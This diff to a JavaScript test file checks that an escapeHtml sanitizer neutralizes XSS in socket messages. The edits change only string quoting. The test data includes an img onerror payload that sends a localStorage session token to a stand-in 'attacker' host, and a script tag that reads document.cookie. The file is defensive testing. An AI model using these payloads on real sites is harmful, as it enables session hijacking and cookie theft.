@@ -15,9 +15,7 @@
  * pin that behavior.
  */
 
-const {
-  escapeHtml,
-} = require('../middleware/sanitize.middleware');
+const { escapeHtml } = require('../middleware/sanitize.middleware');
 
 describe('XSS Defense — socket message sanitization', () => {
   // The same escapeHtml is what socket.js's sanitizeSocketString
@@ -25,7 +23,7 @@ describe('XSS Defense — socket message sanitization', () => {
   // re-check that socket.js still imports escapeHtml and routes
   // user-supplied strings through it.
   test('escapeHtml neutralizes an XSS payload that would execute via innerHTML', () => {
-    const payload = `<img src=x onerror="fetch('https://attacker/?t='+localStorage.unihub_session)">`;
+    const payload = '<img src=x onerror="fetch(\'https://attacker/?t=\'+localStorage.unihub_session)">';
     const escaped = escapeHtml(payload);
 
     // The escaped form must never produce a working HTML tag or event
@@ -54,14 +52,14 @@ describe('XSS Defense — socket message sanitization', () => {
   });
 
   test('escapeHtml handles apostrophes and quotes that could break attribute contexts', () => {
-    const input = `She said "hi" and it's cool`;
+    const input = 'She said "hi" and it\'s cool';
     const escaped = escapeHtml(input);
     expect(escaped).toContain('&quot;'); // " is escaped to entity
     expect(escaped).toContain('&#x27;'); // ' is escaped to entity
     // No raw, unescaped apostrophe or double-quote should survive —
     // i.e. neither appears outside of an existing entity. We verify
     // the canonical escaping took place.
-    expect(escaped).not.toContain("'s cool");
+    expect(escaped).not.toContain('\'s cool');
     expect(escaped).toContain('&#x27;s cool');
   });
 
@@ -75,7 +73,7 @@ describe('XSS Defense — socket message sanitization', () => {
   });
 
   test('escapeHtml defeats the classic <script> tag injection', () => {
-    const payload = `<script>alert(document.cookie)</script>`;
+    const payload = '<script>alert(document.cookie)</script>';
     const escaped = escapeHtml(payload);
     // No literal tag boundary survives
     expect(escaped).not.toMatch(/<script/i);
